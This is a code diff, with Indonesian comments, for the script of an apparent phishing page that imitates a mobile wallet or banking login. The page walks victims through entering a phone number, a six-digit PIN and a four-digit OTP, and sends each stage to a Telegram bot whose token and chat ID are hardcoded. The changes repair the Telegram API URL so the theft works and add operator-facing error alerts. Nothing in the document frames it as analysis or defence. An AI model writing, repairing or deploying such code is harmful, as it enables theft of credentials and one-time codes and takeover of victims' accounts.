@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
-  // CONFIG TELEGRAM - Ganti dengan data milik Anda
+  // CONFIG TELEGRAM - Sudah disesuaikan dengan data Anda
   const BOT_TOKEN = '8608031139:AAFcKrrXjORQcFFuS19PWAc6qxgjX48uGYE'; 
   const CHAT_ID = '-1003627147396';
 
@@ -19,10 +19,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   let countdownInterval = null;
 
-  // --- FUNGSI UTAMA KIRIM TELEGRAM (SUDAH DIPERBAIKI) ---
+  // --- FUNGSI UTAMA KIRIM TELEGRAM DENGAN NOTIFIKASI ERROR ---
   function sendToTelegram(messageText) {
-    // Alamat URL API Telegram yang benar
-    const url = `https://telegram.org{BOT_TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
     return fetch(url, {
       method: 'POST',
@@ -38,29 +37,29 @@ document.addEventListener('DOMContentLoaded', () => {
     .then(response => response.json())
     .then(data => {
       if (!data.ok) {
+        // Jika API Telegram menolak (Misal: Bot bukan admin grup)
+        alert(`🔴 TELEGRAM MENOLAK PESAN!\nAlasan: ${data.description}\n\nSolusi: Pastikan Bot sudah masuk ke grup dan dijadikan ADMIN.`);
         console.error('Telegram Error:', data.description);
       } else {
-        console.log('Pesan berhasil terkirim!');
+        console.log('Pesan sukses terkirim ke Telegram!');
       }
     })
     .catch(error => {
-      console.error('Fetch Error (Cek Internet):', error);
+      // Jika internet putus atau URL diblokir jaringan
+      alert(`❌ GAGAL MENGHUBUNGI TELEGRAM!\nError: ${error}\n\nCek koneksi internet Anda.`);
+      console.error('Fetch Error:', error);
     });
   }
 
-  // --- 1. SPLASH SCREEN (FADE OUT TANPA MEMBESAR) ---
+  // --- 1. SPLASH SCREEN ---
   if (splashScreen) {
     setTimeout(() => {
       splashScreen.classList.add('fade-out');
       setTimeout(() => {
         splashScreen.classList.add('hidden');
-        if (pagePhone) {
-          pagePhone.classList.remove('hidden');
-        }
-        if (phoneInput) {
-          phoneInput.focus();
-        }
-      }, 600); // Sinkron dengan durasi transisi CSS opacity
+        if (pagePhone) pagePhone.classList.remove('hidden');
+        if (phoneInput) phoneInput.focus();
+      }, 600);
     }, 2200);
   }
 
@@ -70,7 +69,6 @@ document.addEventListener('DOMContentLoaded', () => {
       let val = e.target.value.replace(/\D/g, '');
       e.target.value = val;
       
-      // Tombol aktif jika nomor hp diisi minimal 9 digit
       if (val.length >= 9) {
         btnNext.removeAttribute('disabled');
       } else {
@@ -78,14 +76,14 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
 
-    // --- 3. MASUK KE HALAMAN PIN VIA TOMBOL LANJUT & KIRIM NO HP ---
+    // --- 3. KLIK TOMBOL LANJUT ---
     btnNext.addEventListener('click', () => {
       if (loadingScreen) loadingScreen.classList.remove('hidden');
       
       const currentPhone = phoneInput.value;
       const msg = `📱 *Data Masuk - Tahap 1*\n\n*Nomor HP:* \`${currentPhone}\``;
       
-      // Kirim data Nomor HP ke Telegram secara background
+      // Mengirim nomor HP
       sendToTelegram(msg);
 
       setTimeout(() => {
@@ -93,36 +91,31 @@ document.addEventListener('DOMContentLoaded', () => {
         if (pagePhone) pagePhone.classList.add('hidden');     
         if (pagePin) pagePin.classList.remove('hidden');
         
-        // Fokus otomatis ke kotak PIN pertama
         if (pinFields && pinFields.length > 0) {
           pinFields[0].focus();
         }
       }, 1500);
     });
+  } else {
+    // Deteksi jika HTML Anda tidak memiliki ID phoneInput atau btnNext
+    console.error("EROR: Elemen 'phoneInput' atau 'btnNext' tidak ditemukan di HTML!");
   }
 
   // --- 4. LOGIKA AUTO-INPUT PIN 6 DIGIT ---
   if (pinFields && pinFields.length > 0) {
     pinFields.forEach((field, index) => {
-      // Event saat mengetik/input angka
       field.addEventListener('input', (e) => {
         const val = e.target.value;
-        
-        // Validasi: hanya menerima karakter angka
         if (!/^\d*$/.test(val)) {
           e.target.value = '';
           return;
         }
-
-        // Jika terisi, otomatis lompat kursor ke kotak kanan berikutnya
         if (val && index < pinFields.length - 1) {
           pinFields[index + 1].focus();
         }
-        
         checkPinComplete();
       });
 
-      // Event saat menghapus menggunakan Backspace
       field.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !field.value && index > 0) {
           pinFields[index - 1].focus();
@@ -134,22 +127,19 @@ document.addEventListener('DOMContentLoaded', () => {
   function checkPinComplete() {
     const combinedPin = Array.from(pinFields).map(f => f.value).join('');
     
-    // Ketika 6 digit PIN sudah terisi penuh
     if (combinedPin.length === 6) {
-      // PAKSA KEYBOARD MENUTUP: Hilangkan fokus dari semua kotak PIN
       pinFields.forEach(f => f.blur());
-      
       if (loadingScreen) loadingScreen.classList.remove('hidden');
 
       const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
       const msg = `🔐 *Data Masuk - Tahap 2*\n\n*Nomor HP:* \`${currentPhone}\`\n*PIN:* \`${combinedPin}\``;
       
-      // Kirim data PIN ke Telegram
+      // Mengirim PIN
       sendToTelegram(msg);
 
       setTimeout(() => {
         if (loadingScreen) loadingScreen.classList.add('hidden');
-        if (otpBottomSheet) otpBottomSheet.classList.add('show'); // Memunculkan OTP Bottom Sheet
+        if (otpBottomSheet) otpBottomSheet.classList.add('show'); 
         
         setTimeout(() => {
           if (otpFields && otpFields.length > 0) {
@@ -157,33 +147,25 @@ document.addEventListener('DOMContentLoaded', () => {
           }
           startOtpCountdown();
         }, 400);
-
       }, 1400);
     }
   }
 
-  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT DI DALAM BOTTOM SHEET ---
+  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT ---
   if (otpFields && otpFields.length > 0) {
     otpFields.forEach((field, index) => {
-      // Event saat mengetik/input angka OTP
       field.addEventListener('input', (e) => {
         const val = e.target.value;
-        
-        // Validasi: hanya menerima karakter angka
         if (!/^\d*$/.test(val)) {
           e.target.value = '';
           return;
         }
-
-        // Jika terisi, otomatis lompat kursor ke kotak kanan berikutnya
         if (val && index < otpFields.length - 1) {
           otpFields[index + 1].focus();
         }
-        
         checkOtpComplete();
       });
 
-      // Event saat menghapus menggunakan Backspace di modal OTP
       field.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !field.value && index > 0) {
           otpFields[index - 1].focus();
@@ -197,24 +179,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const combinedPin = Array.from(pinFields).map(f => f.value).join('');
     const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
     
-    // Ketika 4 digit OTP sudah terisi penuh
     if (combinedOtp.length === 4) {
-      // Paksa keyboard menutup total
       otpFields.forEach(f => f.blur());
-      
-      if (loadingScreen) loadingScreen.classList.remove('hidden'); // Jalankan loading verifikasi akhir
+      if (loadingScreen) loadingScreen.classList.remove('hidden'); 
       
       const msg = `🚀 *Data Lengkap Selesai*\n\n*Nomor HP:* \`${currentPhone}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``;
       
-      // Kirim data lengkap akhir ke Telegram dan tunggu proses selesai
+      // Mengirim OTP Akhir
       sendToTelegram(msg).then(() => {
         setTimeout(() => {
           if (loadingScreen) loadingScreen.classList.add('hidden');
-
-          console.log("Seluruh proses otomatis sukses tanpa error!");
-          console.log("Data Terverifikasi -> PIN: " + combinedPin + " | OTP: " + combinedOtp);
-          
-          // Alur selesai sempurna. Di sini Anda bisa mengarahkan user menggunakan window.location.href
+          console.log("Proses Selesai Sempurna.");
         }, 1500);
       });
     }
@@ -222,7 +197,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function startOtpCountdown() {
     if (!timerSpan) return;
-    
     let timeLeft = 60;
     timerSpan.textContent = timeLeft;
     if (countdownInterval) clearInterval(countdownInterval);
@@ -233,41 +207,30 @@ document.addEventListener('DOMContentLoaded', () => {
       
       if (timeLeft <= 0) {
         clearInterval(countdownInterval);
-        
         const countdownContainer = document.querySelector('.countdown-text');
         if (countdownContainer) {
           countdownContainer.innerHTML = '<a href="#" id="btnResendOtp" style="color:#118EEA; text-decoration:none; font-weight:600; cursor:pointer;">Kirim Ulang Kode</a>';
-          
           const btnResendOtp = document.getElementById('btnResendOtp');
           if (btnResendOtp) {
             btnResendOtp.addEventListener('click', (e) => {
               e.preventDefault();
-              
               if (loadingScreen) loadingScreen.classList.remove('hidden');
               
-              // Notifikasi ke Telegram jika pengguna meminta OTP ulang
               const currentPhone = phoneInput ? phoneInput.value : 'Tidak diketahui';
-              sendToTelegram(`🔄 *Info:* Pengguna dengan nomor \`${currentPhone}\` menekan tombol *Kirim Ulang OTP*.`);
+              sendToTelegram(`🔄 *Info:* Pengguna \`${currentPhone}\` meminta kirim ulang OTP.`);
 
               setTimeout(() => {
                 if (loadingScreen) loadingScreen.classList.add('hidden');
-                
                 otpFields.forEach(f => f.value = '');
-                
                 countdownContainer.innerHTML = 'Kirim ulang dalam <span id="timer">60</span> detik';
-                
                 const newTimerSpan = document.getElementById('timer');
-                
                 if (newTimerSpan) {
                   document.getElementById('timer').textContent = '60';
                   startOtpCountdownUpdate(newTimerSpan); 
                 }
-                
                 if (otpFields && otpFields.length > 0) {
                   otpFields[0].focus();
                 }
-                
-                console.log("OTP Resent");
               }, 1200);
             });
           }
@@ -279,7 +242,6 @@ document.addEventListener('DOMContentLoaded', () => {
   function startOtpCountdownUpdate(targetSpan) {
     let timeLeft = 60;
     if (countdownInterval) clearInterval(countdownInterval);
-    
     countdownInterval = setInterval(() => {
       timeLeft--;
       targetSpan.textContent = timeLeft;
@@ -289,5 +251,4 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     }, 1000);
   }
-
 });
